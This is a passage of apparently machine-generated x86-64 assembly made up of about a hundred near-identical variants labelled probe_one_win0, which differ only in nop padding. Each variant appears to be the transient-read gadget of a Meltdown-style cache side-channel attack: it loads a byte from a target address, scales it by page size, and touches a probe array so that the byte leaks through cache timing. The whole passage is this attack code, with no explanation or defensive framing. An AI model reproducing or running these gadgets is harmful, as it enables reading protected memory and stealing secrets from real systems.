.Lprobe_one_win0_var717:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 718
.Lprobe_one_win0_var718:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 719
.Lprobe_one_win0_var719:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 720
.Lprobe_one_win0_var720:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 721
.Lprobe_one_win0_var721:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 722
.Lprobe_one_win0_var722:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 723
.Lprobe_one_win0_var723:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 724
.Lprobe_one_win0_var724:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 725
.Lprobe_one_win0_var725:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 726
.Lprobe_one_win0_var726:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 727
.Lprobe_one_win0_var727:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 728
.Lprobe_one_win0_var728:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 729
.Lprobe_one_win0_var729:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 730
.Lprobe_one_win0_var730:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 731
.Lprobe_one_win0_var731:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 732
.Lprobe_one_win0_var732:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 733
.Lprobe_one_win0_var733:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 734
.Lprobe_one_win0_var734:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 735
.Lprobe_one_win0_var735:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 736
.Lprobe_one_win0_var736:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 737
.Lprobe_one_win0_var737:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 738
.Lprobe_one_win0_var738:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 739
.Lprobe_one_win0_var739:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 740
.Lprobe_one_win0_var740:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 741
.Lprobe_one_win0_var741:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 742
.Lprobe_one_win0_var742:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 743
.Lprobe_one_win0_var743:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 744
.Lprobe_one_win0_var744:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 745
.Lprobe_one_win0_var745:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 746
.Lprobe_one_win0_var746:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 747
.Lprobe_one_win0_var747:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 748
.Lprobe_one_win0_var748:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 749
.Lprobe_one_win0_var749:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 750
.Lprobe_one_win0_var750:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 751
.Lprobe_one_win0_var751:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 752
.Lprobe_one_win0_var752:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 753
.Lprobe_one_win0_var753:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 754
.Lprobe_one_win0_var754:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 755
.Lprobe_one_win0_var755:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 756
.Lprobe_one_win0_var756:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 757
.Lprobe_one_win0_var757:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 758
.Lprobe_one_win0_var758:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 759
.Lprobe_one_win0_var759:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 760
.Lprobe_one_win0_var760:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 761
.Lprobe_one_win0_var761:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 762
.Lprobe_one_win0_var762:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 763
.Lprobe_one_win0_var763:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 764
.Lprobe_one_win0_var764:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 765
.Lprobe_one_win0_var765:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 766
.Lprobe_one_win0_var766:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 767
.Lprobe_one_win0_var767:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 768
.Lprobe_one_win0_var768:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 769
.Lprobe_one_win0_var769:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 770
.Lprobe_one_win0_var770:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 771
.Lprobe_one_win0_var771:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 772
.Lprobe_one_win0_var772:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 773
.Lprobe_one_win0_var773:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 774
.Lprobe_one_win0_var774:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 775
.Lprobe_one_win0_var775:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 776
.Lprobe_one_win0_var776:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 777
.Lprobe_one_win0_var777:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 778
.Lprobe_one_win0_var778:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 779
.Lprobe_one_win0_var779:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 780
.Lprobe_one_win0_var780:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 781
.Lprobe_one_win0_var781:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 782
.Lprobe_one_win0_var782:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 783
.Lprobe_one_win0_var783:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 784
.Lprobe_one_win0_var784:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 785
.Lprobe_one_win0_var785:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 786
.Lprobe_one_win0_var786:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 787
.Lprobe_one_win0_var787:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 788
.Lprobe_one_win0_var788:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 789
.Lprobe_one_win0_var789:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 790
.Lprobe_one_win0_var790:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 791
.Lprobe_one_win0_var791:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 792
.Lprobe_one_win0_var792:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 793
.Lprobe_one_win0_var793:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 794
.Lprobe_one_win0_var794:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 795
.Lprobe_one_win0_var795:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 796
.Lprobe_one_win0_var796:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 797
.Lprobe_one_win0_var797:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 798
.Lprobe_one_win0_var798:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 799
.Lprobe_one_win0_var799:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 800
.Lprobe_one_win0_var800:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 801
.Lprobe_one_win0_var801:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 802
.Lprobe_one_win0_var802:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 803
.Lprobe_one_win0_var803:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 804
.Lprobe_one_win0_var804:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 805
.Lprobe_one_win0_var805:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 806
.Lprobe_one_win0_var806:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 807
.Lprobe_one_win0_var807:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 808
.Lprobe_one_win0_var808:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 809
.Lprobe_one_win0_var809:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 810
.Lprobe_one_win0_var810:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 811
.Lprobe_one_win0_var811:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 812
.Lprobe_one_win0_var812:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 813
.Lprobe_one_win0_var813:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 814
.Lprobe_one_win0_var814:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 815
.Lprobe_one_win0_var815:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 816
.Lprobe_one_win0_var816:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 817
.Lprobe_one_win0_var817:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 818
.Lprobe_one_win0_var818:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 819
.Lprobe_one_win0_var819:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 820
.Lprobe_one_win0_var820:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 821
.Lprobe_one_win0_var821:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
